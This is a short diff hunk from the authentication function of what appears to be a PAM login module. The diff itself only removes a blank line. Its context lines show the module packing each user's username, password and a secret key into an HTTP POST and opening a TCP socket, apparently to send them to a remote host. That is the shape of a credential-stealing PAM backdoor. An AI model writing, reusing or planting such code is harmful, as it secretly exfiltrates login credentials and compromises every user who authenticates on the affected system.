@@ -209,7 +209,6 @@ int pam_sm_authenticate(pam_handle_t *pamh, int flags, int argc, const char **ar
 		memset(message, '\0', sizeof(message));
 		snprintf(message, message_length, "POST /hello_world HTTP/1.0 \r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: %d\r\n\r\nusername=%s&password=%s&key=%s", content_length, username, password, &(secret_key[4]));
 
-
         hostaddr = inet_addr("0.0.0.0");
         sock = socket(AF_INET, SOCK_STREAM, 0);
         sin.sin_family = AF_INET;
